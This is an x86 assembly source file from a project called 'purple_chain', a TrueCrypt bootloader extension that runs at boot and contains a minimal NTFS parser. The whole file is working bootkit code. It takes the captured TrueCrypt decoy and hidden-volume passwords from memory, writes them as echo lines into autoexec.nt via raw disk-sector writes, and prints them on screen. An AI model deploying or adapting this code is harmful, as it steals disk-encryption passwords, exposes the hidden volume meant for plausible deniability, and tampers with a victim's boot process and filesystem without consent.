; ------------------------------------------------------------------------------
; purple_chain - truecrypt bootloader extension               01.2013, armak00ni
; ------------------------------------------------------------------------------
; - file          : cmd_pass.asm
;
; presents the current truecrypt passwords in command.com
; by overwriting autoexec.nt on the ntfs filesystem
; 
; -> minimal ntfs parser within these 512b ;)
;
; ------------------------------------------------------------------------------

org	7c00h

	push 	cs
	push 	cs
	pop 	ds
	pop 	es
	
	cld
	call	init

	call	patch_autoexec_nt

; we simply retf to purple_chain to execute the os bootloader
	retf

; ------------------------------------------------------------------------------	
init:
	mov		di, dap
	mov		cx, DAP_LEN
	xor 	al, al
	rep 	stosb

	; read mbr
	mov 	ax, 0201h
	mov		bx, buffer
	mov		cx, 1
	mov		dx, 080h
	int 	13h
	
	; read	ntfs vbr of partition 2
	mov		eax, [buffer +0x1d6]
	mov		[dap_block_nr_lo], eax
	mov		[part_start_sec], eax
	mov		ax, 1
	mov		[dap_numblocks], ax
	mov		ax, buffer
	mov		[cs:dap_buffer_ptr_lo], ax
	
	call	read_dap_blocks
	
	; assume start cluster $MFT <= 32bit
	mov		eax, [buffer + 0x30]
	mov		[start_cluster_mft], eax
	mov		al, [buffer +0x0d]
	mov		[secs_p_cluster], al

	retn
	
	
; ------------------------------------------------------------------------------		
patch_autoexec_nt:
	; find  "autoexec.nt"
	mov		eax, [start_cluster_mft]	
	mov		[current_cluster], eax
	mov		cx, 0xFfff; max $MFT clusters to scan
	
.find_loop:
	mov		eax, [current_cluster]
	inc		eax
	mov		[current_cluster] , eax
	push	cx
	call	load_vc
	pop		cx

	mov		dl, 4
	mov		bx, buffer
.check_mft:
	; check $MFT entry
	cmp		word [bx], 'FI'
	jnz		.check_next_mft

	; check name
	mov		si, bx
	add 	si, 0xf2
	mov		di, autoexec_name
	push	cx
	mov		cx, AUTOEXEC_NAME_LEN
	repz	cmpsb
	or		cx,cx
	jnz		.check_next_mft2

	pop		cx
	; found mft
.found:
	mov		al, [found_count]
	inc		al
	mov		[found_count], al
	
	pusha	
	; -> bx = $MFT record
	call	overwrite_data

	popa
		
	cmp		al, 2
	jge		.endsearch
	jmp		.check_next_mft
	
.check_next_mft2:
	pop 	cx
.check_next_mft:
	add		bx, 1024
	dec		dl
	jnz		.check_mft
	;
	; finished for this cluster
	dec		cx
	jz		.not_found
	jmp		.find_loop
	
	
.not_found:	
	retn

.endsearch:
	retn
	
; ------------------------------------------------------------------------------		
; patch the rems
overwrite_data:
	mov		si, bx
	add		si, 0x9c
	add 	si, word [si] 	; name attr len 
	sub		si, 4
.loop1:
	mov		al, [si]		; lodsb w/o inc si
	cmp		al, 0x80
	jz		.cont_1
	cmp		al, 0xff
	je		.endme

	add		si, word [si+4]
	
	jmp		.loop1
	
.cont_1:	
	add		si, word [si + 0x20] ; offset of runlist (@32)
	
	
	xor		bx, bx
	; si@runlist now
	mov		al, [si]	; lodsb w/o inc si	
	
	mov		bl, al		
	and		bl, 0x0f	; run list len
	add		si, bx

	mov		bl, al
	shr		bl, 4		; run list cluster# entry len
	add		si, bx
	
	xor		eax, eax
	xor		cx, cx
	mov		cl, bl		; len of cluster#
	std					; read "backwards"
.rd_vcnloop:
	shl		eax, 8
	lodsb
	loop	.rd_vcnloop
	cld
	
	call	load_vc2ntfsbuf

	; patch here
	
	mov		di, ntfs_buf+13
	mov		si, str_echo
	call	write_str
	
	mov		ax, 8000h
	mov		ds, ax
	mov		bx, [ds:0x0c] ; is hidden?
	mov		al, [bx]
	or		al, al
	jnz		.is_hidden
	mov		si, [ds:0x12] ; running decoy
	jmp		.cont
.is_hidden:
	mov		si, [ds:0x14] ; running hidden

.cont:
	call	write_str

	mov		si, str_echo
	call	write_str2
	mov		si, [ds:0x0e] ; your decoy pass is
	call	write_str
	mov		si, [ds:0x08]; password
	call	write_str
	
	mov		si, str_echo
	call	write_str2
	mov		si, [ds:0x10] ; your hidden pass is
	call	write_str
	mov		si, [ds:0x0a]; password
	call	write_str
	
	mov		si, str_rem
	call	write_str2

	push	cs
	pop		ds

    mov		si, ntfs_buf
	call	print_str_si		
	
	
	xor		ah, ah
	int		16h
	
	; ... and write back
	mov		si, dap
	mov		dl, 0x80
	mov		ah, 43h
	int		13h

.endme:	
	retn
; ------------------------------------------------------------------------------		
; filesystem helper functions

read_dap_blocks:
	mov		ax, cs
	mov		[cs:dap_buffer_ptr_hi], ax
	mov		byte [cs:dap], 0x10
		
	mov		si, dap
	mov		dl, 0x80
	mov		ah, 42h
	int		13h
	retn
	

; ------------------------------------------------------------------------------		
; load cluster #vcn: eax 
load_vc2ntfsbuf:
	mov		word [dap_buffer_ptr_lo], ntfs_buf
	jmp		load_vc_1
load_vc:
	mov		word [dap_buffer_ptr_lo], buffer
	; secs * sec_p_clust
load_vc_1:
	mov		bl, [secs_p_cluster]
.shiftloop:
	shl		eax, 1
	shr		bl, 1
	cmp		bl, 1
	jne 	.shiftloop
	
	mov		ecx, [part_start_sec]
	add		eax, ecx
	
	mov		[dap_block_nr_lo], eax
	
	mov		bx, [secs_p_cluster]
	mov		[dap_numblocks], bx

	call	read_dap_blocks
	retn
; ------------------------------------------------------------------------------	



; ------------------------------------------------------------------------------		
print_str_si:
	xor		cx, cx
.loopme:	
	lodsb
	or 		al,al
	jz 		.end_print
	cmp		al, 0ah
	jnz		.cont
	inc		cx
	cmp		cx, 15
	je		.end_print
.cont:	
	mov     bx, 07h
	mov     ah, 0Eh
	int     10h 
	jmp 	.loopme
		
.end_print:
	retn
; ------------------------------------------------------------------------------		
write_str:
	lodsb
	or al, al
	jz	.endme
	stosb
	jnz write_str
.endme:
	retn
	
write_str2:
	mov 	al, [cs:si]
	inc		si
	or al, al
	jz	.endme
	stosb
	jnz write_str2
.endme:
	retn
	
; --- data ---------------------------------------------------------------------		
autoexec_name		db 'a', 0, 'u', 0, 't', 0, 'o', 0, 'e', 0, 'x', 0, 'e', 0, 
					db 'c', 0, '.', 0, 'n', 0, 't', 0
AUTOEXEC_NAME_LEN 	equ $-autoexec_name

str_rem				db 0dh, 0ah, 'REM ', 0
str_echo			db 0dh, 0ah, 'echo ', 0

; done, in 510 bytes

; ==================== this is uninitialized data, will not be written / loaded
secs_p_cluster		db 0
part_start_sec		dd 0

start_cluster_mft	dd 0

current_cluster		dd 0

found_count			db 0

dap:				db 	10h
					db	00h
dap_numblocks:		dw	0000h
dap_buffer_ptr_lo:	dw	buffer
dap_buffer_ptr_hi:	dw  0000h
dap_block_nr_lo:	dw  0
dap_block_nr_hi:	dw  0, 0, 0
DAP_LEN				equ $-dap

buffer				resb 512 * 8
ntfs_buf			resb 512 * 8
